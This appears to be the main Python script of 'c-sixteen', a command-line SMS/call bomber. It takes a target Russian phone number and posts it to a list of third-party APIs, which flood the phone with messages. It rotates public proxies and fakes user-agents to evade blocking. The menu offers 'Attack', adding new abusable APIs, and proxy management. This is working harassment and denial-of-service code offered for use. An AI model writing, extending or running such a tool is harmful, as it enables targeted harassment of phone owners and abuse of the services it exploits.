import logging
import random
from sys import argv

from s1xt33n import *
from s1xt33n import __version__

proxies = []


def reloadproxies():
    global proxies
    print("Receiving proxies...")
    proxies = getproxies()
    if len(proxies) > 0:
        return print(f"Received proxies ({len(proxies)}): " + ", ".join(
            proxies) + f"\nThanks to {PROXIES_URL} for providing proxies.")
    print("No proxies are available at this time.")


argv = [i.lower() for i in argv[1:]]
logging.basicConfig(level=logging.INFO if "--log" in argv or "-l" in argv else logging.WARNING)
logger = logging.getLogger("c-sixteen")

slinput = lambda x: input(x).strip().lower()


def main():
    if "--no-proxy" not in argv:
        reloadproxies()
    print()

    while True:

        match slinput("1. Attack\n"
                      "2. Add an API\n"
                      "3. List APIs\n"
                      "4. Reload proxies\n"
                      "5. List proxies\n"
                      "6. Exit\n"
                      "-> "):

            case "6" | "q" | "quit" | "exit":
                exit(0)

            case "1":
                try:
                    number = PhoneNumber(input(
                        # f"Select the target phone number (format +79{random.randint(10 ** 8, 10 ** 9 - 1)}): ").strip().replace(
                        f"Select the target phone number, only RU numbers are supported (Keyboard Interrupt to get back): ").strip().replace(
                        "-", "").replace(" ", ""))
                except KeyboardInterrupt:
                    print()
                    continue
                apisdata: dict = apisfile.load()
                headers = {"user-agent": faker.user_agent()}
                proxy = None
                if "--no-proxy" not in argv and len(proxies) > 0:
                    proxy = {"http": "http://" + random.choice(proxies)}
                    print(f"{proxy['http']} will be used as proxy.")
                for i in apisdata:
                    r = None
                    try:
                        local = SpamAPI(number,
                                        apisdata[i]["url"],
                                        apisdata[i]["phone_key"],
                                        apisdata[i]["format_type"],
                                        apisdata[i]["data"],
                                        headers,
                                        proxy)
                        r = local.post()
                        if r.status_code > 299:
                            raise Exception(f"Status code {r.status_code} > 299")
                        if r.status_code < 200:
                            raise Exception(f"Status code {r.status_code} < 200")
                        print(f"[+] {i} ({r})")
                    except Exception as e:
                        print(f"[-] {i} ({r})\nException was raised while posting {i}: {e}")

            case "2":
                try:
                    print("Keyboard Interrupt to get back.")
                    name = slinput("name/domain (not api url) -> ")
                    api = {
                        "url": slinput("api url -> "),
                        "format_type": slinput("format type (PhoneNumber.dict) -> "),
                        "phone_key": slinput("phone key -> "),
                        "data": json.loads(input("data -> "))
                    }
                except KeyboardInterrupt:
                    print()
                    continue
                data = apisfile.load()
                data[name] = api
                print(json.dumps(data, indent=2))
                if slinput("proceed? (y/n) -> ") in ["y", "", "1", "true"]:
                    apisfile.dump(data)
                print(f"The {name} API with {api['url']=} was added successfully!")

            case "3":
                print(apisfile.dumps())
                apisdata = apisfile.load()
                for i in apisdata:
                    print(f"{i} - {apisdata[i]['url']=}")

            case "4":
                if "--no-proxy" in argv:
                    print("c-sixteen is launched with --no-proxy argument. Try relaunching it without the arg")
                    continue
                reloadproxies()

            case "5":
                if "--no-proxy" in argv:
                    print("c-sixteen is launched with --no-proxy argument. Try relaunching it without the arg")
                    continue
                print("Active proxies: " + ", ".join(proxies))

            case _:
                print("unknown command")

if __name__ == '__main__':
    try:
        print(logo)
        print(f"Currently running c-sixteen {__version__}. Copyright (c) 2025 blurry16")
        main()
    except KeyboardInterrupt:
        exit(0)
